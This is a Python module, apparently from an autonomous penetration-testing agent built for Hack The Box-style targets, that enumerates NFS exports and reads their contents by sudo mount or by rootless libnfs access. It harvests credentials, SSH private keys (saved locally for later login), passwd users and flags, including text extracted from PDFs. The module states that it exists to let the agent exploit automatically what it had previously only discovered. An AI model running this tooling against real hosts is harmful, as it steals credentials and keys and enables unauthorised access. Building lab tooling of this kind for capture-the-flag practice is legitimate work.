"""NFS 자동 정찰 — 열린 export 를 '읽기 전용'으로 마운트해 자격·SSH 키·플래그를 수확한다.

배경(실측): HTB 'Enigma' 류 박스는 `showmount -e` 로 드러난 NFS export(`/srv/nfs/onboarding *`)
가 초기 침투의 전제인데, 마운트는 로컬 root(sudo)+셸이 필요해 자율 에이전트가 '생성 전용' 경계
때문에 자동으로 안 했다(발견만 했다). 이 모듈이 그 갭을 메운다.

안전 경계(불변):
  · **옵트인 전용**(--full-auto 등 exploit_exec/auto_poc 하에서만 오케스트레이터가 호출).
  · **타겟 IP 한정** — showmount 는 바인딩된 타겟에만, 마운트도 그 IP 의 export 만(스코프 확장 없음).
  · **읽기 전용 마운트**(ro,nolock) + 작업 후 **반드시 umount** + 임시 마운트포인트만 사용.
  · 실제 mount/umount(root 필요)는 **주입 가능한 함수**로 분리 — 기본은 `sudo -n`(비대화형,
    캐시된 sudo 타임스탬프). 권한 없으면 조용히 실패 대신 '1회 수동 안내'로 폴백(무확인 강제 아님).
  · 스캔은 순수 파일시스템 '읽기'만 — 마운트된 트리에서 아무 것도 실행하지 않는다.
"""
from __future__ import annotations

import os
import re
import shutil
import subprocess
import tempfile
from dataclasses import dataclass, field

# ── showmount 파싱 ───────────────────────────────────────────────────
# `showmount -e <ip>` 출력:
#   Export list for <ip>:
#   /srv/nfs/onboarding *
#   /srv/share      10.10.0.0/24
_EXPORT_RE = re.compile(r"^(/\S+)\s+(\S.*)$")


def parse_exports(showmount_output: str) -> list[str]:
    """`showmount -e` 출력에서 export 경로 목록을 뽑는다(순수 파싱). 'Export list for' 헤더·
    빈 줄·에러 줄은 무시. 절대경로(/로 시작)만 수용. 중복 제거, 입력 순서 보존."""
    out: list[str] = []
    for raw in (showmount_output or "").splitlines():
        line = raw.strip()
        if not line or line.lower().startswith("export list"):
            continue
        m = _EXPORT_RE.match(line)
        if m and m.group(1) not in out:
            out.append(m.group(1))
    return out


# ── 마운트 트리 스캔(순수 읽기) ───────────────────────────────────────
_PRIVKEY_RE = re.compile(r"-----BEGIN (?:[A-Z0-9 ]+ )?PRIVATE KEY-----")
_MAX_FILES = 3000          # 과다 트리 방어(무한 walk 방지)
_MAX_READ = 512 * 1024     # 파일당 읽기 상한(512KB)
# 건너뛰는 '비텍스트 바이너리'. 문서(_DOC_EXT)는 여기서 빼고 텍스트 추출로 돌린다 —
# 실측(Enigma): 온보딩 PDF(New_Employee_Access.pdf) 한 장에 발판 자격이 들어 있었고,
# .pdf 를 통째로 스킵해 수확이 0이 되던 버그를 고친다.
_SKIP_EXT = {".iso", ".img", ".zip", ".gz", ".xz", ".bz2", ".tar", ".jpg",
             ".jpeg", ".png", ".gif", ".mp4", ".mkv", ".so", ".bin"}
# 바이너리지만 '텍스트를 품은' 문서 — nfs-cp 로 받아 텍스트를 추출해 harvest 로 넘긴다.
_DOC_EXT = {".pdf"}
_MAX_DOC = 8 * 1024 * 1024  # 문서 다운로드 상한(8MB) — 추출 비용·악성 과대파일 방어


def _strings_from_file(path: str, min_len: int = 4) -> str:
    """추출기가 없을 때의 폴백 — 바이너리에서 가독 ASCII 문자열만 뽑는다(`strings` 유사)."""
    try:
        with open(path, "rb") as f:
            data = f.read(_MAX_DOC)
    except OSError:
        return ""
    out, cur = [], []
    for b in data:
        if 32 <= b < 127:
            cur.append(chr(b))
        else:
            if len(cur) >= min_len:
                out.append("".join(cur))
            cur = []
    if len(cur) >= min_len:
        out.append("".join(cur))
    return "\n".join(out)


def extract_doc_text(path: str) -> str:
    """문서(PDF 등)에서 텍스트 추출 — pdftotext(poppler) 우선 → pypdf/PyPDF2 → 가독 문자열 폴백.
    실행 아님(대상 파일을 읽기만). 추출 실패해도 예외 없이 빈/부분 문자열 반환."""
    ext = os.path.splitext(path)[1].lower()
    if ext == ".pdf":
        if shutil.which("pdftotext"):
            try:
                p = subprocess.run(["pdftotext", "-layout", path, "-"],
                                   capture_output=True, text=True,
                                   errors="replace", timeout=30)
                if p.returncode == 0 and (p.stdout or "").strip():
                    return p.stdout
            except (OSError, subprocess.SubprocessError):
                pass
        import contextlib
        import io
        for mod in ("pypdf", "PyPDF2"):
            try:
                m = __import__(mod)
                # pypdf 는 파싱 경고('EOF marker not found' 등)를 stderr 로 뱉는다 — 폴백 경로의
                # 소음이므로 억제(결과 텍스트에는 영향 없음).
                with contextlib.redirect_stderr(io.StringIO()):
                    reader = m.PdfReader(path)
                    txt = "\n".join((pg.extract_text() or "") for pg in reader.pages)
                if txt.strip():
                    return txt
            except Exception:   # noqa: BLE001 — 라이브러리 부재/파싱 실패는 폴백으로
                continue
    return _strings_from_file(path)


@dataclass
class NfsFinding:
    """마운트된 export 스캔 결과(발판 재료). 전부 '읽기'로만 얻는다."""
    export: str = ""
    creds: list[tuple[str, str]] = field(default_factory=list)   # (user, pass)
    ssh_keys: list[str] = field(default_factory=list)            # 발견한 개인키 '절대경로'
    flags: list[tuple[str, str]] = field(default_factory=list)   # (kind, value)
    notable: list[str] = field(default_factory=list)             # 흥미로운 상대경로(안내용)
    users: list[str] = field(default_factory=list)               # 후보 사용자명(SSH 키 로그인용)


def _is_keyname(name: str) -> bool:
    return name in ("id_rsa", "id_ecdsa", "id_ed25519", "id_dsa") or name.endswith(".pem")


def _notable_name(name: str) -> bool:
    low = name.lower()
    return any(k in low for k in ("cred", "pass", "secret", "config", ".env",
                                  "onboard", "welcome", "readme", "user", "note"))


def _harvest_text(fnd: NfsFinding, rel: str, name: str, text: str,
                  seen_cred: set, seen_flag: set, cred_parser, flag_scanner,
                  flag_kind: str) -> bool:
    """한 파일의 '내용(text)'에서 자격·플래그·사용자를 수확한다(키는 호출측이 보존 처리).
    반환값: 이 파일이 SSH 개인키인가(True 면 호출측이 경로/내용을 ssh_keys 로 보존)."""
    # 후보 사용자: home/<user>/ 경로 패턴
    hm = re.search(r"(?:^|/)home/([A-Za-z_][A-Za-z0-9_-]{0,31})/", "/" + rel)
    if hm and hm.group(1) not in fnd.users:
        fnd.users.append(hm.group(1))
    if _PRIVKEY_RE.search(text) or _is_keyname(name):
        if rel not in fnd.notable:
            fnd.notable.append(rel)
        return True
    # user.txt/root.txt 는 '파일명으로' 종류를 확정해 기록(flag.scan 의 32-hex 맥락 휴리스틱에
    # 의존하지 않음 — NFS 공유에 user.txt 가 그대로 있는 경우를 확실히 잡는다).
    low = name.lower()
    if low in ("user.txt", "root.txt"):
        from .flag import extract_flags
        kind = "user" if low == "user.txt" else "root"
        for val in extract_flags(text):
            if val not in seen_flag:
                seen_flag.add(val)
                fnd.flags.append((kind, val))
        if rel not in fnd.notable:
            fnd.notable.append(rel)
        return False
    # /etc/passwd 류: 로그인 가능 사용자(uid 1000~65533)
    if name == "passwd" or rel.endswith("etc/passwd"):
        for pl in text.splitlines():
            parts = pl.split(":")
            if len(parts) >= 7 and parts[2].isdigit() and 1000 <= int(parts[2]) < 65534:
                if parts[0] and parts[0] not in fnd.users:
                    fnd.users.append(parts[0])
    try:
        for u, p, _label in cred_parser(text):
            if (u, p) not in seen_cred:
                seen_cred.add((u, p))
                fnd.creds.append((u, p))
    except Exception:   # noqa: BLE001 — 파서 예외는 무시(스캔 지속)
        pass
    try:
        for hit in flag_scanner(f"[nfs] {rel}", text, flag_kind):
            if hit.value not in seen_flag:
                seen_flag.add(hit.value)
                fnd.flags.append((hit.kind, hit.value))
    except Exception:   # noqa: BLE001
        pass
    if _notable_name(name) and rel not in fnd.notable:
        fnd.notable.append(rel)
    return False


def _resolve_parsers(cred_parser, flag_scanner):
    if cred_parser is None:
        from .cred_sources import parse_config_creds as cred_parser
    if flag_scanner is None:
        from .flag import scan as flag_scanner
    return cred_parser, flag_scanner


def scan_tree(root: str, export: str = "", flag_kind: str = "boot2root",
              cred_parser=None, flag_scanner=None) -> NfsFinding:
    """마운트된(or 로컬) 디렉터리 트리를 '읽기'로 훑어 자격·SSH 개인키·플래그를 수확한다.
    SSH 키는 '로컬 절대경로'로 ssh_keys 에 담는다(마운트 경로 — 호출측이 umount 전 보존 복사).
    파일 실행은 절대 하지 않는다(정적 읽기 only)."""
    cred_parser, flag_scanner = _resolve_parsers(cred_parser, flag_scanner)
    fnd = NfsFinding(export=export)
    seen_cred: set[tuple[str, str]] = set()
    seen_flag: set[str] = set()
    count = 0
    for dirpath, _dirs, files in os.walk(root):
        for name in files:
            if count >= _MAX_FILES:
                return fnd
            count += 1
            full = os.path.join(dirpath, name)
            rel = os.path.relpath(full, root)
            ext = os.path.splitext(name)[1].lower()
            is_doc = ext in _DOC_EXT
            if ext in _SKIP_EXT and not _is_keyname(name):
                continue
            try:
                lim = _MAX_DOC if is_doc else _MAX_READ
                if os.path.getsize(full) > lim and not _is_keyname(name):
                    continue
                if is_doc:
                    text = extract_doc_text(full)   # PDF 등 → 텍스트 추출 후 harvest
                else:
                    with open(full, encoding="utf-8", errors="replace") as f:
                        text = f.read(_MAX_READ)
            except OSError:
                continue
            if _harvest_text(fnd, rel, name, text, seen_cred, seen_flag,
                             cred_parser, flag_scanner, flag_kind):
                if full not in fnd.ssh_keys:
                    fnd.ssh_keys.append(full)   # 마운트 경로(로컬 절대경로)
    return fnd


# ── rootless NFS 읽기(libnfs: nfs-ls/nfs-cp — sudo·마운트 불필요) ─────────────
# 기본(권장) 경로: 커널 마운트·root 없이 유저스페이스로 export 를 나열·읽는다 → 자동화·안전 둘 다.
# 실제 nfs-ls/nfs-cp 실행은 주입 가능한 run(argv)->(rc,out) 로 분리(테스트·러너 호환).
def have_libnfs(which_fn=None) -> bool:
    """rootless NFS 도구(libnfs-utils 의 nfs-ls)가 설치돼 있는가."""
    import shutil
    w = which_fn or shutil.which
    return bool(w("nfs-ls"))


def _nfs_url(ip: str, export: str, path: str = "") -> str:
    # export 는 '/srv/nfs/onboarding', path 는 '/home/nico/id_rsa'(선행 / 포함/미포함 모두 허용)
    tail = ("/" + path.lstrip("/")) if path else ""
    return f"nfs://{ip}{export}{tail}"


def parse_nfs_ls(output: str) -> list[str]:
    """`nfs-ls -R nfs://ip/export` 출력에서 '파일 상대경로'를 뽑는다(디렉터리/빈줄 제외).
    libnfs nfs-ls 는 재귀 시 각 항목을 경로로 출력한다. 장식(퍼미션/타입 프리픽스)이 붙을 수
    있어, 각 줄의 '마지막 토큰'을 경로 후보로 보고, 디렉터리 표식(끝 '/')·'.'/'..' 은 제외한다."""
    out: list[str] = []
    for raw in (output or "").splitlines():
        line = raw.strip()
        if not line or line in (".", ".."):
            continue
        tok = line.split()[-1]            # 'drwx... name' 형식이면 마지막 토큰이 경로
        if tok.endswith("/") or tok in (".", ".."):
            continue
        tok = tok.lstrip("./")
        if tok and tok not in out:
            out.append(tok)
    return out


def scan_via_libnfs(ip: str, export: str, run, keystore: str,
                    flag_kind: str = "boot2root", cred_parser=None, flag_scanner=None,
                    max_files: int = 400) -> tuple["NfsFinding", bool]:
    """rootless(libnfs)로 export 를 나열·읽어 수확한다. SSH 키는 nfs-cp 로 로컬 keystore 에
    0600 저장(마운트 없음). run(argv)->(rc,out) 주입. (NfsFinding, ok) 반환 — ok=False 면
    목록 실패(상위가 --priv-env sudo 마운트/수동안내로 폴백). 원격에서 아무 것도 실행하지 않음."""
    cred_parser, flag_scanner = _resolve_parsers(cred_parser, flag_scanner)
    fnd = NfsFinding(export=export)
    rc, out = run(["nfs-ls", "-R", _nfs_url(ip, export)])
    paths = parse_nfs_ls(out) if rc == 0 else []
    if rc != 0:
        return fnd, False
    seen_cred: set[tuple[str, str]] = set()
    seen_flag: set[str] = set()
    key_idx = 0
    tmpd = tempfile.mkdtemp(prefix="assassin_nfscp_")
    try:
        for rel in paths[:max_files]:
            name = rel.rsplit("/", 1)[-1]
            ext = os.path.splitext(name)[1].lower()
            is_doc = ext in _DOC_EXT
            if ext in _SKIP_EXT and not _is_keyname(name):
                continue
            # nfs-cp 로 '임시파일'에 받는다(바이너리 안전 — PDF 등 문서/키 모두 깨짐 없음).
            # stdout('-') 경유는 바이너리가 텍스트 캡처에서 손상되므로 쓰지 않는다.
            dest = os.path.join(tmpd, f"f{key_idx}")
            rc2, _ = run(["nfs-cp", _nfs_url(ip, export, rel), dest])
            if rc2 != 0 or not os.path.exists(dest) or os.path.getsize(dest) == 0:
                continue
            if is_doc:
                text = extract_doc_text(dest)   # PDF 등 → 텍스트 추출 후 harvest
            else:
                try:
                    with open(dest, encoding="utf-8", errors="replace") as f:
                        text = f.read(_MAX_READ)
                except OSError:
                    continue
            if _harvest_text(fnd, rel, name, text, seen_cred, seen_flag,
                             cred_parser, flag_scanner, flag_kind):
                # 키는 로컬 keystore 에 0600 보존(SSH 로그인용) — 받은 임시파일을 복사
                try:
                    os.makedirs(keystore, exist_ok=True)
                    kdest = os.path.join(keystore, f"key_{key_idx}")
                    shutil.copyfile(dest, kdest)
                    os.chmod(kdest, 0o600)
                    fnd.ssh_keys.append(kdest)
                except OSError:
                    pass
            key_idx += 1
    finally:
        shutil.rmtree(tmpd, ignore_errors=True)
    return fnd, True


# ── 실제 마운트/언마운트(root 필요 — 주입 가능, 기본은 sudo -n) ────────────
def _run(argv: list[str], timeout: float = 30.0) -> tuple[int, str]:
    try:
        p = subprocess.run(argv, capture_output=True, text=True,
                           errors="replace", timeout=timeout, stdin=subprocess.DEVNULL)
        return p.returncode, (p.stdout or "") + (p.stderr or "")
    except (OSError, subprocess.SubprocessError) as e:
        return -1, f"{type(e).__name__}: {e}"


def sudo_mount(ip: str, export: str, mountpoint: str, vers: str = "3",
               runner=None) -> tuple[bool, str]:
    """`sudo -n mount -t nfs -o ro,nolock,vers=<v> <ip>:<export> <mnt>` (비대화형 sudo).
    성공 True. runner(argv)->(rc,out) 주입 가능(테스트). 캐시된 sudo 없으면 rc!=0 → (False, 이유)."""
    run = runner or _run
    os.makedirs(mountpoint, exist_ok=True)
    rc, out = run(["sudo", "-n", "mount", "-t", "nfs", "-o",
                   f"ro,nolock,vers={vers}", f"{ip}:{export}", mountpoint])
    return (rc == 0), out.strip()


def sudo_umount(mountpoint: str, runner=None) -> None:
    """best-effort 언마운트(실패 무시 — 정리용). runner 주입 가능."""
    run = runner or _run
    run(["sudo", "-n", "umount", mountpoint])


def manual_hint(ip: str, export: str) -> str:
    """sudo 가 안 될 때 남기는 1회 수동 안내(권한 확인 자산 전용)."""
    mp = f"/mnt/nfs_{re.sub(r'[^A-Za-z0-9]+', '_', export).strip('_') or 'export'}"
    return ("NFS export 수동 마운트(권한 확인 자산 전용) → 온보딩/설정/키 확인: "
            f"sudo mkdir -p {mp} && sudo mount -t nfs -o ro,nolock {ip}:{export} {mp} && ls -laR {mp}")
